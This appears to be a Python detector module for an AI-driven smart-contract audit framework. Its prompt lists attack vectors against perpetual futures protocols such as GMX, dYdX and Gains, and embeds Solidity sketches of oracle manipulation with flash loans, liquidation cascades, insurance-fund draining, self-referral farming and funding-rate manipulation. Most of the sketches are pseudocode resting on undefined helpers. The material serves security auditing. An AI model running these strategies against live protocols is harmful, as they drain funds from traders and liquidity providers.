"""Perpetual Protocol Attack Vectors detector for Wake-AI framework."""

from wake_ai import workflow
from wake_ai.templates import SimpleDetector


@workflow.command(name="perpetual-protocol-attacks")
def factory():
    """Run perpetual protocol attack vectors detector."""
    return PerpetualProtocolAttacksDetector()


class PerpetualProtocolAttacksDetector(SimpleDetector):
    """Advanced detector for Perpetual Protocol attack vectors."""

    def get_detector_prompt(self) -> str:
        """Define the perpetual protocol attack detection workflow."""
        return """# Perpetual Protocol Attack Vectors Analysis

## Task
Perform comprehensive analysis of 5 attack vectors targeting decentralized perpetual futures protocols including Perpetual V1, Perpetual V2, dYdX, GMX, and Gains, focusing on funding rate manipulation, liquidation attacks, and oracle exploitation.

## Target Attack Vectors

### 🔴 Critical Severity (4 vectors)
1. **Perpetual V1 Attack**
   - Virtual AMM manipulation
   - Funding rate gaming
   - Insurance fund drainage
   - K-value exploitation
   - Position liquidation attacks

2. **Perpetual V2 Attack**
   - Concentrated liquidity manipulation
   - Maker position exploitation
   - Range order attacks
   - Fee tier gaming
   - Slippage manipulation

3. **dYdX Perpetual Attack**
   - Cross-margin exploitation
   - Isolated margin attacks
   - Oracle price manipulation
   - Liquidation engine gaming
   - Insurance fund attacks

4. **GMX Perpetual Attack**
   - GLP pool manipulation
   - Price feed exploitation
   - Liquidation threshold gaming
   - Multi-asset arbitrage
   - Borrowing fee manipulation

### 🟡 High Severity (1 vector)
5. **Gains Perpetual Attack**
   - DAI vault manipulation
   - Referral system exploitation
   - Trading fee gaming
   - Spread manipulation
   - Leverage limit bypasses

## Analysis Process

### 1. Discovery Phase
- Map perpetual protocol architectures
- Identify funding mechanisms
- Locate liquidation systems
- Find oracle dependencies
- Analyze margin requirements

### 2. Attack Vector Analysis

#### Virtual AMM Exploitation
- Check curve manipulation vectors
- Analyze K-value stability
- Look for slippage amplification
- Test AMM state corruption
- Verify rebalancing mechanisms

#### Funding Rate Gaming
- Map funding rate calculations
- Check payment intervals
- Analyze rate cap mechanisms
- Look for manipulation windows
- Test funding arbitrage

#### Liquidation System Attacks
- Check liquidation triggers
- Analyze liquidation penalties
- Look for partial liquidation gaming
- Test keeper frontrunning
- Verify insurance fund mechanics

#### Oracle Price Manipulation
- Map price feed dependencies
- Check oracle lag exploitation
- Analyze price update mechanisms
- Look for feed manipulation vectors
- Test emergency price sources

#### Cross-Asset Arbitrage
- Check multi-asset correlations
- Analyze cross-margin interactions
- Look for portfolio margin gaming
- Test asset substitution attacks
- Verify risk calculation errors

### 3. Perpetual-Specific Exploit Patterns

#### Funding Rate Arbitrage
- Long/short funding imbalances
- Cross-platform funding arbitrage
- Temporal funding rate gaming
- Position size optimization
- Fee structure exploitation

#### Liquidation Cascade Attacks
- Mass liquidation triggers
- Liquidation price manipulation
- Insurance fund depletion
- Cascade amplification techniques
- Recovery mechanism bypasses

#### Margin Requirement Gaming
- Initial margin manipulation
- Maintenance margin exploitation
- Cross-margin optimization
- Portfolio margin attacks
- Leverage limit bypasses

## Documentation Requirements

For each perpetual attack:
- **Protocol Affected**: Specific perpetual platform
- **Attack Category**: Funding, liquidation, oracle, or arbitrage
- **Position Requirements**: Long/short positioning needed
- **Market Conditions**: Required volatility/liquidity
- **Profit Mechanism**: How value is extracted
- **Risk Assessment**: Exposure and liquidation risks
- **Mitigation**: Protocol-specific defenses

## Validation Criteria
- Test with realistic position sizes
- Consider market impact costs
- Verify funding rate dynamics
- Account for liquidation risks
- Provide perpetual-specific fixes

## Special Focus Areas

### Perpetual V1 Virtual AMM Attack
```solidity
// Perpetual V1 vAMM manipulation:
contract PerpetualV1Attack {
    IAmm public amm;
    IClearingHouse public clearingHouse;
    
    function manipulateVirtualAMM() external {
        // Step 1: Open large position to skew AMM
        uint256 baseAssetAmount = 1000000e18; // 1M position
        clearingHouse.openPosition(
            address(amm),
            ITypes.Side.BUY,
            baseAssetAmount,
            10e18, // 10x leverage
            0 // no price limit
        );
        
        // Step 2: AMM is now skewed, funding rate will adjust
        waitForFundingRateAdjustment();
        
        // Step 3: Open opposite position on another platform
        openOppositePositionOnCompetitor();
        
        // Step 4: Collect funding rate arbitrage
        collectFundingArbitrage();
    }
    
    function exploitKValue() external {
        // Attack K-value stability in AMM
        uint256 initialK = amm.quoteAssetReserve() * amm.baseAssetReserve();
        
        // Step 1: Large buy to change reserves
        clearingHouse.openPosition(
            address(amm),
            ITypes.Side.BUY,
            5000000e18, // Massive position
            50e18, // High leverage
            0
        );
        
        // Step 2: Check if K-value maintained
        uint256 newK = amm.quoteAssetReserve() * amm.baseAssetReserve();
        
        if (newK != initialK) {
            // K-value broken, exploit the arbitrage
            exploitBrokenK();
        }
    }
    
    function drainInsuranceFund() external {
        // Target insurance fund through coordinated liquidations
        
        // Step 1: Identify highly leveraged positions
        address[] memory targets = findHighlyLeveragedPositions();
        
        // Step 2: Manipulate price to trigger liquidations
        manipulatePriceForLiquidations();
        
        // Step 3: Bad debt exceeds insurance fund
        // Insurance fund gets drained
        triggerMassLiquidations(targets);
    }
}
```

### Perpetual V2 Concentrated Liquidity Attack
```solidity
// Perpetual V2 liquidity manipulation:
contract PerpetualV2Attack {
    IMarketRegistry public marketRegistry;
    IClearingHouse public clearingHouse;
    
    function manipulateConcentratedLiquidity() external {
        // Step 1: Become major liquidity provider in tight range
        int24 lowerTick = -1000;
        int24 upperTick = 1000;
        uint256 liquidity = 10000000e18;
        
        clearingHouse.addLiquidity(
            address(baseToken),
            lowerTick,
            upperTick,
            liquidity
        );
        
        // Step 2: Open large position to move price to range boundary
        clearingHouse.openPosition(
            address(baseToken),
            true, // long
            5000000e18,
            20e18, // 20x leverage
            0
        );
        
        // Step 3: Remove liquidity at boundary to create slippage
        clearingHouse.removeLiquidity(
            address(baseToken),
            lowerTick,
            upperTick,
            liquidity
        );
        
        // Step 4: Close position with extreme slippage benefit
        clearingHouse.closePosition(address(baseToken), 0);
    }
    
    function exploitMakerPositions() external {
        // Attack passive liquidity providers
        
        // Step 1: Identify concentrated liquidity ranges
        (int24 lowerTick, int24 upperTick, uint256 liquidity) = findMajorLiquidityRange();
        
        // Step 2: Push price to range boundary
        pushPriceToRangeBoundary(lowerTick, upperTick);
        
        // Step 3: Makers get impermanent loss, we profit from directional move
        extractValueFromMakers();
    }
}
```

### dYdX Perpetual Cross-Margin Attack
```solidity
// dYdX cross-margin exploitation:
contract DydxAttack {
    ISoloMargin public soloMargin;
    IPerpetualV1 public perpetual;
    
    function exploitCrossMargin() external {
        // Step 1: Deposit collateral across multiple markets
        depositCollateralAcrossMarkets();
        
        // Step 2: Max leverage on all positions
        openMaxLeveragePositions();
        
        // Step 3: Manipulate one market to affect cross-margin calculation
        manipulateMarginCalculation();
        
        // Step 4: Extract value through margin requirement gaming
        extractValueThroughMargin();
    }
    
    function manipulateOracleForLiquidation() external {
        // Step 1: Identify target positions near liquidation
        address[] memory targets = findNearLiquidationPositions();
        
        // Step 2: Flash loan to manipulate oracle price
        uint256 flashAmount = 50000000e6; // $50M USDC
        aaveFlashLoan(flashAmount, abi.encodeWithSelector(this.executeOracleAttack.selector, targets));
    }
    
    function executeOracleAttack(address[] memory targets) external {
        // Step 3: Manipulate underlying asset price
        manipulateUnderlyingPrice();
        
        // Step 4: Trigger liquidations at manipulated price
        for (uint i = 0; i < targets.length; i++) {
            perpetual.liquidate(targets[i], 0, type(uint256).max);
        }
        
        // Step 5: Restore price and collect liquidation profits
        restorePriceAndCollectProfits();
    }
}
```

### GMX GLP Pool Manipulation
```solidity
// GMX GLP pool attack:
contract GMXAttack {
    IGlpManager public glpManager;
    IVault public vault;
    IPositionRouter public positionRouter;
    
    function manipulateGLPPool() external {
        // Step 1: Identify GLP composition imbalances
        address[] memory tokens = vault.allWhitelistedTokens();
        uint256[] memory weights = new uint256[](tokens.length);
        
        for (uint i = 0; i < tokens.length; i++) {
            weights[i] = vault.poolAmounts(tokens[i]);
        }
        
        // Step 2: Find overweight asset to exploit
        address overweightAsset = findOverweightAsset(tokens, weights);
        
        // Step 3: Large position in overweight direction
        openLargePosition(overweightAsset);
        
        // Step 4: Manipulate asset price to affect GLP pricing
        manipulateAssetPrice(overweightAsset);
    }
    
    function exploitPriceFeedLag() external {
        // Step 1: Monitor price feed update lag
        uint256 chainlinkPrice = getChainlinkPrice();
        uint256 actualMarketPrice = getActualMarketPrice();
        
        if (actualMarketPrice > chainlinkPrice * 105 / 100) { // 5% lag
            // Step 2: Open position based on stale price
            positionRouter.createIncreasePosition{value: 0.01 ether}(
                address(weth), // collateral
                address(weth), // index token
                1000e18, // size
                0, // size delta
                true, // is long
                chainlinkPrice * 95 / 100, // acceptable price (old price)
                0.01 ether, // execution fee
                bytes32(0), // referral code
                address(0) // callback
            );
            
            // Step 3: Close when price updates
            schedulePositionClose();
        }
    }
    
    function drainGLPLiquidity() external {
        // Step 1: Coordinate large withdrawal during high utilization
        waitForHighUtilization();
        
        // Step 2: Large GLP redemption
        uint256 glpAmount = glp.balanceOf(address(this));
        glpManager.removeLiquidity(
            address(weth), // token out
            glpAmount,
            0, // min out
            address(this)
        );
        
        // Step 3: This reduces GLP backing, affecting all positions
        // Other users face higher borrowing costs
    }
}
```

### Gains Network DAI Vault Attack
```solidity
// Gains Network vault manipulation:
contract GainsAttack {
    ITradingStorage public tradingStorage;
    ITradingCallbacks public tradingCallbacks;
    IGToken public gDai;
    
    function manipulateDAIVault() external {
        // Step 1: Become major DAI vault depositor
        uint256 depositAmount = 1000000e18; // $1M DAI
        dai.approve(address(gDai), depositAmount);
        gDai.deposit(depositAmount, address(this));
        
        // Step 2: Open maximum leverage positions
        openMaxLeveragePositions();
        
        // Step 3: Manipulate price feeds during volatile periods
        waitForVolatileMarket();
        openPositionsWithManipulatedPrices();
        
        // Step 4: Extract profits and withdraw from vault
        closeProfitablePositions();
        gDai.withdraw(gDai.balanceOf(address(this)), address(this));
    }
    
    function exploitReferralSystem() external {
        // Step 1: Create referral network
        address[] memory referrers = createReferralNetwork();
        
        // Step 2: Generate trading volume through self-referrals
        for (uint i = 0; i < referrers.length; i++) {
            generateVolumeWithReferrer(referrers[i]);
        }
        
        // Step 3: Collect referral rewards
        collectReferralRewards(referrers);
    }
    
    function manipulateTradingFees() external {
        // Attack fee structure through position sizing
        
        // Step 1: Identify fee tiers
        uint256[] memory feeTiers = getTradingFeeTiers();
        
        // Step 2: Optimize position sizes for minimal fees
        for (uint i = 0; i < feeTiers.length; i++) {
            openOptimalSizePosition(feeTiers[i]);
        }
        
        // Step 3: Close positions with fee arbitrage profit
        closePositionsWithArbitrage();
    }
}
```

### Cross-Protocol Perpetual Arbitrage
```solidity
// Multi-protocol perpetual arbitrage:
contract PerpetualArbitrage {
    mapping(string => address) public protocols;
    
    function executePerpetualArbitrage() external {
        // Step 1: Monitor funding rates across protocols
        int256 perpV1Rate = getPerpV1FundingRate();
        int256 dydxRate = getDydxFundingRate();
        int256 gmxRate = getGMXFundingRate();
        int256 gainsRate = getGainsFundingRate();
        
        // Step 2: Find largest rate differential
        (string memory longProtocol, string memory shortProtocol, int256 rateDiff) = 
            findLargestRateDifferential(perpV1Rate, dydxRate, gmxRate, gainsRate);
        
        // Step 3: Execute funding rate arbitrage
        if (rateDiff > 0.01e18) { // 1% rate difference
            executeFundingArbitrage(longProtocol, shortProtocol, rateDiff);
        }
        
        // Step 4: Monitor and rebalance positions
        monitorAndRebalance();
    }
    
    function executeFundingArbitrage(
        string memory longProtocol,
        string memory shortProtocol,
        int256 rateDiff
    ) internal {
        uint256 positionSize = calculateOptimalPositionSize(rateDiff);
        
        // Long on protocol with negative funding (receive funding)
        openLongPosition(protocols[longProtocol], positionSize);
        
        // Short on protocol with positive funding (receive funding)
        openShortPosition(protocols[shortProtocol], positionSize);
        
        // Delta neutral position with funding rate arbitrage
    }
    
    function exploitLiquidationDifferences() external {
        // Step 1: Find positions near liquidation on different protocols
        Position[] memory perpV1Positions = findNearLiquidationPositions(protocols["perpv1"]);
        Position[] memory gmxPositions = findNearLiquidationPositions(protocols["gmx"]);
        
        // Step 2: Arbitrage liquidation price differences
        for (uint i = 0; i < perpV1Positions.length; i++) {
            for (uint j = 0; j < gmxPositions.length; j++) {
                if (canArbitrageLiquidation(perpV1Positions[i], gmxPositions[j])) {
                    executeLiquidationArbitrage(perpV1Positions[i], gmxPositions[j]);
                }
            }
        }
    }
}
```

### Perpetual Funding Rate Manipulation
```solidity
// Funding rate gaming attack:
contract FundingRateManipulation {
    function manipulateFundingRates() external {
        // Step 1: Identify funding rate calculation window
        uint256 fundingWindow = getFundingCalculationWindow();
        
        // Step 2: Large position during calculation period
        uint256 manipulationAmount = 100000000e18; // $100M position
        
        // Open large long position to skew funding
        openLargePosition(true, manipulationAmount, fundingWindow);
        
        // Step 3: Close position immediately after funding fixed
        waitForFundingRateFixing();
        closePosition();
        
        // Step 4: Open opposite position to benefit from manipulated rate
        openOppositePosition();
        
        // Step 5: Collect funding payments over time
        collectFundingPayments();
    }
    
    function coordinatedFundingAttack() external {
        // Coordinate multiple accounts for funding manipulation
        address[] memory accounts = createMultipleAccounts();
        
        for (uint i = 0; i < accounts.length; i++) {
            // Each account opens position in same direction
            executeFromAccount(accounts[i], abi.encodeWithSelector(this.openSkewingPosition.selector));
        }
        
        // Combined effect skews funding rate significantly
        waitForFundingRateAdjustment();
        
        // All accounts close and open opposite positions
        for (uint i = 0; i < accounts.length; i++) {
            executeFromAccount(accounts[i], abi.encodeWithSelector(this.flipPosition.selector));
        }
    }
}
```

Focus on identifying vulnerabilities specific to perpetual futures protocols, including virtual AMM manipulation, funding rate gaming, liquidation cascade attacks, oracle dependencies, and cross-protocol arbitrage opportunities. Pay special attention to the complex interactions between leverage, margin requirements, and funding mechanisms."""